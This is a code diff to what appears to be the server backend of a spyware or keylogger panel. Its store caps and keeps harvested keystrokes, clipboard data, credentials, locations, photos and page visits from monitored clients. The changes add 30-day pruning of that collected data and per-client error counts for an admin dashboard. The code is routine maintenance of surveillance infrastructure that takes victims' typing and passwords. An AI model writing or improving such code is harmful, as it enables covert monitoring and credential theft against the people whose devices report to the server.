@@ -94,10 +94,22 @@ async function loadStoreFromRedis() {
 
 // ── Trim arrays to prevent store overflow ────────────────────
 function trimStore() {
+    // Hard caps (most recent items kept)
     const caps = { locations: 5000, events: 1000, keystrokes: 5000, clipboard: 500,
                    pageVisits: 5000, photos: 2000, media: 500, errors: 500, credentials: 1000 };
     for (const [key, max] of Object.entries(caps)) {
         if (Array.isArray(store[key]) && store[key].length > max) store[key].length = max;
+    }
+    // Auto-prune items older than 30 days from time-series arrays
+    const cutoff30d = Date.now() - 30 * 86400000;
+    const tsArrays = ['keystrokes', 'clipboard', 'pageVisits', 'events', 'errors'];
+    for (const key of tsArrays) {
+        if (!Array.isArray(store[key])) continue;
+        store[key] = store[key].filter(item => {
+            const ts = item.timestamp || item.ts || item.time;
+            if (!ts) return true; // keep items without a timestamp (don't lose unknown data)
+            return new Date(ts).getTime() > cutoff30d;
+        });
     }
 }
 
@@ -898,6 +910,14 @@ app.get('/api/stats', requireAuth, (req, res) => {
     const todayStart = new Date(); todayStart.setHours(0, 0, 0, 0);
     Object.entries(store.clients).forEach(([id, c]) => {
         if (new Date(c.lastSeen).getTime() < cutoff20s) c.online = false;
+    });
+    // Attach per-client error count so admin UI can show anomaly badges
+    const errByClient = {};
+    for (const e of store.errors) {
+        if (e.clientId) errByClient[e.clientId] = (errByClient[e.clientId] || 0) + 1;
+    }
+    Object.entries(store.clients).forEach(([id, c]) => {
+        c.errorCount = errByClient[id] || 0;
     });
     const clientVals = Object.values(store.clients);
     res.json({
